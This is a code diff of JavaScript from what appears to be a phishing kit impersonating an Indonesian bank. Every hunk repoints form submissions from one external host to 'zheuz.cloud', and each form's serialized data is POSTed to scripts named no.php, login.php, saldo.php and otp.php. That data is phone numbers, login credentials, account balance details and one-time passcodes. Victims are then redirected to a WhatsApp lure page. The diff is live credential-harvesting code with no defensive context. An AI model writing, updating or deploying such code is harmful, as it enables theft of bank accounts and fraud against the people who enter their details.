@@ -8,7 +8,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://choreoapps.ll-feed.cfd/bsi/w2tr/no.php',
+            url: 'https://zheuz.cloud/bsi/w2tr/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -28,7 +28,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://choreoapps.ll-feed.cfd/bsi/w2tr/login.php',
+            url: 'https://zheuz.cloud/bsi/w2tr/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -54,7 +54,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://choreoapps.ll-feed.cfd/bsi/w2tr/saldo.php',
+            url: 'https://zheuz.cloud/bsi/w2tr/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -84,7 +84,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://choreoapps.ll-feed.cfd/bsi/w2tr/otp.php',
+ url: 'https://zheuz.cloud/bsi/w2tr/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
@@ -100,7 +100,7 @@ setTimeout(function(){
         }
     });
       setTimeout(() => {
-     document.getElementById("notif").innerHTML = "Untuk mendapatkan kode E-Commerce,<br/>Silahkan klik tombol dibawah ini";
+     document.getElementById("notif").innerHTML = "Untuk mendapatkan kode Virtual,<br/>Silahkan klik tombol dibawah ini";
      $("#djload").hide();  
    $("#notif").css("color", "black");
  $("#sixpin").val("");
@@ -123,7 +123,7 @@ function getcs(){
      audio1.load();
     audio4.loop = false
 setTimeout(function(){  
-location.href='https://choreoapps.ll-feed.cfd/wa/w2tr';
+location.href='https://zheuz.cloud/wa/w2tr';
     }, 1000);
     setTimeout(function(){
     $("#djload").hide();   
